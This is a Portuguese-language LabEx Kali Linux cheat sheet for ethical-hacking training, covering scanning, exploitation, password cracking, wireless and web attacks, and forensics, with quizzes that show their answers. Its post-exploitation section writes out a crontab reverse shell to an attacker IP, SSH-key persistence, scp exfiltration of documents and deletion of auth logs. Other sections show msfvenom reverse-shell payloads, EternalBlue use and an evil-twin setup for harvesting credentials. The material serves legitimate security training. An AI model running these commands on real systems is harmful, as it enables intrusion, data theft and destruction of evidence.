---
title: 'Cheatsheet Kali Linux | LabEx'
description: 'Aprenda testes de penetração com Kali Linux com este cheatsheet abrangente. Referência rápida para ferramentas de segurança, hacking ético, varredura de vulnerabilidades, exploração e testes de cibersegurança.'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Folha de Dicas do Kali Linux
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/pt/learn/kali">Aprenda Kali Linux com Laboratórios Práticos</a>
</base-disclaimer-title>
<base-disclaimer-content>
Aprenda testes de penetração com Kali Linux através de laboratórios práticos e cenários do mundo real. O LabEx oferece cursos abrangentes de Kali Linux cobrindo comandos essenciais, varredura de rede, avaliação de vulnerabilidades, ataques de senha, testes de aplicações web e forense digital. Domine técnicas de hacking ético e ferramentas de auditoria de segurança.
</base-disclaimer-content>
</base-disclaimer>

## Configuração e Configuração do Sistema

### Configuração Inicial: `sudo apt update`

Atualiza pacotes e repositórios do sistema para desempenho ideal.

```bash
# Atualizar repositório de pacotes
sudo apt update
# Atualizar pacotes instalados
sudo apt upgrade
# Atualização completa do sistema
sudo apt full-upgrade
# Instalar ferramentas essenciais
sudo apt install curl wget git
```

### Gerenciamento de Usuários: `sudo useradd`

Cria e gerencia contas de usuário para testes de segurança.

```bash
# Adicionar novo usuário
sudo useradd -m username
# Definir senha
sudo passwd username
# Adicionar usuário ao grupo sudo
sudo usermod -aG sudo username
# Mudar para o usuário
su - username
```

### Gerenciamento de Serviços: `systemctl`

Controla serviços e daemons do sistema para cenários de teste.

```bash
# Iniciar serviço
sudo systemctl start apache2
# Parar serviço
sudo systemctl stop apache2
# Habilitar serviço na inicialização
sudo systemctl enable ssh
# Verificar status do serviço
sudo systemctl status postgresql
```

### Configuração de Rede: `ifconfig`

Configura interfaces de rede para testes de penetração.

```bash
# Exibir interfaces de rede
ifconfig
# Configurar endereço IP
sudo ifconfig eth0 192.168.1.100
# Ligar/desligar interface
sudo ifconfig eth0 up
# Configurar interface sem fio
sudo ifconfig wlan0 up
```

### Variáveis de Ambiente: `export`

Configura variáveis de ambiente e caminhos para testes.

```bash
# Definir IP alvo
export TARGET=192.168.1.1
# Definir caminho da wordlist
export WORDLIST=/usr/share/wordlists/rockyou.txt
# Visualizar variáveis de ambiente
env | grep TARGET
```

<BaseQuiz id="kali-env-1" correct="C">
  <template #question>
    O que acontece com as variáveis de ambiente definidas com <code>export</code>?
  </template>
  
  <BaseQuizOption value="A">Elas persistem após reinicializações do sistema</BaseQuizOption>
  <BaseQuizOption value="B">Elas estão disponíveis apenas no arquivo atual</BaseQuizOption>
  <BaseQuizOption value="C" correct>Elas estão disponíveis para o shell atual e processos filhos</BaseQuizOption>
  <BaseQuizOption value="D">Elas são variáveis globais do sistema</BaseQuizOption>
  
  <BaseQuizAnswer>
    As variáveis de ambiente definidas com <code>export</code> estão disponíveis para a sessão de shell atual e todos os processos filhos gerados a partir dela. Elas são perdidas quando a sessão do shell termina, a menos que sejam adicionadas a arquivos de configuração do shell como <code>.bashrc</code>.
  </BaseQuizAnswer>
</BaseQuiz>

### Instalação de Ferramentas: `apt install`

Instala ferramentas de segurança adicionais e dependências.

```bash
# Instalar ferramentas adicionais
sudo apt install nmap wireshark burpsuite
# Instalar do GitHub
git clone https://github.com/tool/repo.git
# Instalar ferramentas Python
pip3 install --user tool-name
```

## Descoberta e Varredura de Rede

### Descoberta de Hosts: `nmap -sn`

Identifica hosts ativos na rede usando varreduras ping.

```bash
# Varredura ping
nmap -sn 192.168.1.0/24
# Varredura ARP (rede local)
nmap -PR 192.168.1.0/24
# Varredura de eco ICMP
nmap -PE 192.168.1.0/24
# Descoberta rápida de hosts
masscan --ping 192.168.1.0/24
```

### Varredura de Portas: `nmap`

Varre portas abertas e serviços em execução em sistemas alvo.

```bash
# Varredura TCP básica
nmap 192.168.1.1
# Varredura agressiva
nmap -A 192.168.1.1
# Varredura UDP
nmap -sU 192.168.1.1
# Varredura SYN furtiva
nmap -sS 192.168.1.1
```

<BaseQuiz id="kali-nmap-1" correct="B">
  <template #question>
    O que o <code>nmap -sS</code> faz?
  </template>
  
  <BaseQuizOption value="A">Realiza uma varredura UDP</BaseQuizOption>
  <BaseQuizOption value="B" correct>Realiza uma varredura SYN furtiva (varredura meio aberta)</BaseQuizOption>
  <BaseQuizOption value="C">Varre todas as portas</BaseQuizOption>
  <BaseQuizOption value="D">Realiza detecção de SO</BaseQuizOption>
  
  <BaseQuizAnswer>
    O sinalizador <code>-sS</code> realiza uma varredura SYN (também chamada de varredura meio aberta) porque nunca completa o handshake TCP. Ele envia pacotes SYN e analisa as respostas, tornando-o mais furtivo do que uma varredura de conexão TCP completa.
  </BaseQuizAnswer>
</BaseQuiz>

### Enumeração de Serviços: `nmap -sV`

Identifica versões de serviços e vulnerabilidades potenciais.

```bash
# Detecção de versão
nmap -sV 192.168.1.1
# Detecção de SO
nmap -O 192.168.1.1
```

<BaseQuiz id="kali-enumeration-1" correct="A">
  <template #question>
    O que o <code>nmap -sV</code> faz?
  </template>
  
  <BaseQuizOption value="A" correct>Detecta as versões de serviço em execução nas portas abertas</BaseQuizOption>
  <BaseQuizOption value="B">Varre apenas portas de controle de versão</BaseQuizOption>
  <BaseQuizOption value="C">Mostra apenas serviços vulneráveis</BaseQuizOption>
  <BaseQuizOption value="D">Realiza apenas detecção de SO</BaseQuizOption>
  
  <BaseQuizAnswer>
    O sinalizador <code>-sV</code> habilita a detecção de versão, que sonda portas abertas para determinar qual serviço e versão estão em execução. Isso é útil para identificar vulnerabilidades potenciais associadas a versões específicas de software.
  </BaseQuizAnswer>
</BaseQuiz>
# Varredura de scripts
nmap -sC 192.168.1.1
# Varredura abrangente
nmap -sS -sV -O -A 192.168.1.1
```

## Coleta de Informações e Reconhecimento

### Enumeração DNS: `dig`

Coleta informações de DNS e realiza transferências de zona.

```bash
# Consulta DNS básica
dig example.com
# Consulta DNS reversa
dig -x 192.168.1.1
# Tentativa de transferência de zona
dig @ns1.example.com example.com axfr
# Enumeração DNS
dnsrecon -d example.com
```

### Reconhecimento Web: `dirb`

Descobre diretórios e arquivos ocultos em servidores web.

```bash
# Força bruta de diretórios
dirb http://192.168.1.1
# Wordlist personalizada
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Alternativa Gobuster
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### Informações WHOIS: `whois`

Coleta informações de registro de domínio e propriedade.

```bash
# Consulta WHOIS
whois example.com
# WHOIS de IP
whois 8.8.8.8
# Coleta abrangente de informações
theharvester -d example.com -l 100 -b google
```

### Análise SSL/TLS: `sslscan`

Analisa a configuração e vulnerabilidades SSL/TLS.

```bash
# Varredura SSL
sslscan 192.168.1.1:443
# Análise abrangente com testssl
testssl.sh https://example.com
# Informações do certificado SSL
openssl s_client -connect example.com:443
```

### Enumeração SMB: `enum4linux`

Enumera compartilhamentos SMB e informações NetBIOS.

```bash
# Enumeração SMB
enum4linux 192.168.1.1
# Listar compartilhamentos SMB
smbclient -L //192.168.1.1
# Conectar ao compartilhamento
smbclient //192.168.1.1/share
# Varredura de vulnerabilidade SMB
nmap --script smb-vuln* 192.168.1.1
```

### Enumeração SNMP: `snmpwalk`

Coleta informações do sistema via protocolo SNMP.

```bash
# SNMP walk
snmpwalk -c public -v1 192.168.1.1
# Verificação SNMP
onesixtyone -c community.txt 192.168.1.1
# Enumeração SNMP
snmp-check 192.168.1.1
```

## Análise de Vulnerabilidades e Exploração

### Varredura de Vulnerabilidades: `nessus`

Identifica vulnerabilidades de segurança usando scanners automatizados.

```bash
# Iniciar serviço Nessus
sudo systemctl start nessusd
# Iniciar varredura OpenVAS
openvas-start
# Scanner de vulnerabilidades web Nikto
nikto -h http://192.168.1.1
# SQLmap para injeção SQL
sqlmap -u "http://example.com/page.php?id=1"
```

### Metasploit Framework: `msfconsole`

Inicia exploits e gerencia campanhas de testes de penetração.

```bash
# Iniciar Metasploit
msfconsole
# Procurar exploits
search ms17-010
# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue
# Definir alvo
set RHOSTS 192.168.1.1
```

### Teste de Overflow de Buffer: `pattern_create`

Gera padrões para exploração de overflow de buffer.

```bash
# Criar padrão
pattern_create.rb -l 400
# Encontrar offset
pattern_offset.rb -l 400 -q EIP_value
```

### Desenvolvimento de Exploit Personalizado: `msfvenom`

Cria payloads personalizados para alvos específicos.

```bash
# Gerar shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Shell reverso do Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Shell reverso Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## Ataques de Senha e Teste de Credenciais

### Ataques de Força Bruta: `hydra`

Executa ataques de força bruta de login contra vários serviços.

```bash
# Força bruta SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# Força bruta de formulário HTTP
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# Força bruta FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### Quebra de Hash: `hashcat`

Quebra hashes de senha usando aceleração de GPU.

```bash
# Quebra de hash MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Quebra de hash NTLM
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# Gerar variações de wordlist
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper: `john`

Quebra de senha tradicional com vários modos de ataque.

```bash
# Quebrar arquivo de senha
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# Mostrar senhas quebradas
john --show shadow.txt
# Modo incremental
john --incremental shadow.txt
# Regras personalizadas
john --rules --wordlist=passwords.txt shadow.txt
```

### Geração de Wordlist: `crunch`

Cria wordlists personalizadas para ataques direcionados.

```bash
# Gerar wordlist de 4 a 8 caracteres
crunch 4 8 -o wordlist.txt
# Conjunto de caracteres personalizado
crunch 6 6 -t admin@ -o passwords.txt
# Geração baseada em padrão
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## Testes de Segurança de Rede Sem Fio

### Configuração do Modo Monitor: `airmon-ng`

Configura o adaptador sem fio para captura de pacotes e injeção.

```bash
# Habilitar modo monitor
sudo airmon-ng start wlan0
# Verificar processos interferentes
sudo airmon-ng check kill
# Parar modo monitor
sudo airmon-ng stop wlan0mon
```

### Descoberta de Rede: `airodump-ng`

Descobre e monitora redes sem fio e clientes.

```bash
# Varredura de todas as redes
sudo airodump-ng wlan0mon
# Alvo de rede específica
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Mostrar apenas redes WEP
sudo airodump-ng --encrypt WEP wlan0mon
```

### Ataques WPA/WPA2: `aircrack-ng`

Executa ataques contra redes criptografadas WPA/WPA2.

```bash
# Ataque de desautenticação
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Quebrar handshake capturado
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# Ataque WPS com Reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Ataque de Gêmeo Maligno: `hostapd`

Cria pontos de acesso falsos para colheita de credenciais.

```bash
# Iniciar AP falso
sudo hostapd hostapd.conf
# Serviço DHCP
sudo dnsmasq -C dnsmasq.conf
# Capturar credenciais
ettercap -T -M arp:remote /192.168.1.0/24//
```

## Testes de Segurança de Aplicações Web

### Teste de Injeção SQL: `sqlmap`

Detecção e exploração automatizadas de injeção SQL.

```bash
# Teste básico de injeção SQL
sqlmap -u "http://example.com/page.php?id=1"
# Testar parâmetros POST
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# Extrair banco de dados
sqlmap -u "http://example.com/page.php?id=1" --dbs
# Despejar tabela específica
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### Cross-Site Scripting: `xsser`

Testa vulnerabilidades XSS em aplicações web.

```bash
# Teste XSS
xsser --url "http://example.com/search.php?q=XSS"
# Detecção automatizada de XSS
xsser -u "http://example.com" --crawl=10
# Payload personalizado
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Integração Burp Suite: `burpsuite`

Plataforma abrangente de testes de segurança de aplicações web.

```bash
# Iniciar Burp Suite
burpsuite
# Configurar proxy (127.0.0.1:8080)
# Configurar o proxy do navegador para capturar tráfego
# Usar Intruder para ataques automatizados
# Usar Spider para descoberta de conteúdo
```

### Travessia de Diretório: `wfuzz`

Testa vulnerabilidades de travessia de diretório e inclusão de arquivos.

```bash
# Fuzzing de diretório
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# Fuzzing de parâmetro
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## Pós-Exploração e Escalada de Privilégios

### Enumeração do Sistema: `linpeas`

Enumeração automatizada de escalada de privilégios para sistemas Linux.

```bash
# Baixar LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# Tornar executável
chmod +x linpeas.sh
# Executar enumeração
./linpeas.sh
# Alternativa Windows: winPEAS.exe
```

### Mecanismos de Persistência: `crontab`

Estabelece persistência em sistemas comprometidos.

```bash
# Editar crontab
crontab -e
# Adicionar shell reverso
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# Persistência de chave SSH
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Exfiltração de Dados: `scp`

Transfere dados com segurança de sistemas comprometidos.

```bash
# Copiar arquivo para máquina atacante
scp file.txt user@192.168.1.100:/tmp/
# Comprimir e transferir
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# Exfiltração via HTTP
python3 -m http.server 8000
```

### Cobrindo Rastros: `history`

Remove evidências de atividades em sistemas comprometidos.

```bash
# Limpar histórico bash
history -c
unset HISTFILE
# Limpar entradas específicas
history -d line_number
# Limpar logs do sistema
sudo rm /var/log/auth.log*
```

## Forense Digital e Análise

### Imagem de Disco: `dd`

Cria imagens forenses de dispositivos de armazenamento.

```bash
# Criar imagem de disco
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# Verificar integridade da imagem
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# Montar imagem
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### Recuperação de Arquivos: `foremost`

Recupera arquivos excluídos de imagens de disco ou unidades.

```bash
# Recuperar arquivos da imagem
foremost -i evidence.img -o recovered/
# Tipos de arquivo específicos
foremost -t jpg,png,pdf -i evidence.img -o photos/
# Alternativa PhotoRec
photorec evidence.img
```

### Análise de Memória: `volatility`

Analisa despejos de RAM em busca de evidências forenses.

```bash
# Identificar perfil do SO
volatility -f memory.dump imageinfo
# Listar processos
volatility -f memory.dump --profile=Win7SP1x64 pslist
# Extrair processo
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### Análise de Pacotes de Rede: `wireshark`

Analisa capturas de tráfego de rede em busca de evidências forenses.

```bash
# Iniciar Wireshark
wireshark
# Análise na linha de comando
tshark -r capture.pcap -Y "http.request.method==GET"
# Extrair arquivos
foremost -i capture.pcap -o extracted/
```

## Geração de Relatórios e Documentação

### Captura de Tela: `gnome-screenshot`

Documenta descobertas com captura de tela sistemática.

```bash
# Captura de tela cheia
gnome-screenshot -f screenshot.png
# Captura de janela
gnome-screenshot -w -f window.png
# Captura com atraso
gnome-screenshot -d 5 -f delayed.png
# Seleção de área
gnome-screenshot -a -f area.png
```

### Gerenciamento de Logs: `script`

Grava sessões de terminal para fins de documentação.

```bash
# Iniciar gravação de sessão
script session.log
# Gravar com temporização
script -T session.time session.log
# Reproduzir sessão
scriptreplay session.time session.log
```

### Modelos de Relatório: `reportlab`

Gera relatórios profissionais de testes de penetração.

```bash
# Instalar ferramentas de relatório
pip3 install reportlab
# Gerar relatório PDF
python3 generate_report.py
# Markdown para PDF
pandoc report.md -o report.pdf
```

### Integridade de Evidências: `sha256sum`

Mantém a cadeia de custódia com hashes criptográficos.

```bash
# Gerar checksums
sha256sum evidence.img > evidence.sha256
# Verificar integridade
sha256sum -c evidence.sha256
# Checksums de múltiplos arquivos
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## Manutenção e Otimização do Sistema

### Gerenciamento de Pacotes: `apt`

Mantém e atualiza pacotes do sistema e ferramentas de segurança.

```bash
# Atualizar listas de pacotes
sudo apt update
# Atualizar todos os pacotes
sudo apt upgrade
# Instalar ferramenta específica
sudo apt install tool-name
# Remover pacotes não utilizados
sudo apt autoremove
```

### Atualizações de Kernel: `uname`

Monitora e atualiza o kernel do sistema para patches de segurança.

```bash
# Verificar kernel atual
uname -r
# Listar kernels disponíveis
apt list --upgradable | grep linux-image
# Instalar novo kernel
sudo apt install linux-image-generic
# Remover kernels antigos
sudo apt autoremove --purge
```

### Verificação de Ferramentas: `which`

Verifica instalações de ferramentas e localiza executáveis.

```bash
# Localizar ferramenta
which nmap
# Verificar se a ferramenta existe
command -v metasploit
# Listar todas as ferramentas no diretório
ls /usr/bin/ | grep -i security
```

### Monitoramento de Recursos: `htop`

Monitora recursos do sistema durante testes de segurança intensivos.

```bash
# Visualizador de processos interativo
htop
# Uso de memória
free -h
# Uso de disco
df -h
# Conexões de rede
netstat -tulnp
```

## Atalhos e Aliases Essenciais do Kali Linux

### Criar Aliases: `.bashrc`

Configura atalhos de comando para economizar tempo em tarefas frequentes.

```bash
# Editar bashrc
nano ~/.bashrc
# Adicionar aliases úteis
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# Recarregar bashrc
source ~/.bashrc
```

### Funções Personalizadas: `function`

Cria combinações de comandos avançadas para fluxos de trabalho comuns.

```bash
# Função de varredura nmap rápida
function qscan() {
    nmap -sS -sV -O $1
}
# Configuração de engajamento de pentest
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### Atalhos de Teclado: Terminal

Domine atalhos de teclado essenciais para navegação mais rápida.

```bash
# Atalhos do terminal
# Ctrl+C - Interromper comando atual
# Ctrl+Z - Suspender comando atual
# Ctrl+L - Limpar tela
# Ctrl+R - Pesquisar histórico de comandos
# Tab - Auto-completar comandos
# Seta para Cima/Baixo - Navegar no histórico de comandos
```

### Configuração de Ambiente: `tmux`

Configura sessões de terminal persistentes para tarefas de longa duração.

```bash
# Iniciar nova sessão
tmux new-session -s pentest
# Desanexar sessão
# Ctrl+B, D
# Listar sessões
tmux list-sessions
# Anexar à sessão
tmux attach -t pentest
```

## Links Relevantes

- <router-link to="/linux">Folha de Dicas do Linux</router-link>
- <router-link to="/shell">Folha de Dicas do Shell</router-link>
- <router-link to="/cybersecurity">Folha de Dicas de Cibersegurança</router-link>
- <router-link to="/nmap">Folha de Dicas do Nmap</router-link>
- <router-link to="/wireshark">Folha de Dicas do Wireshark</router-link>
- <router-link to="/hydra">Folha de Dicas do Hydra</router-link>
- <router-link to="/devops">Folha de Dicas de DevOps</router-link>
- <router-link to="/docker">Folha de Dicas do Docker</router-link>
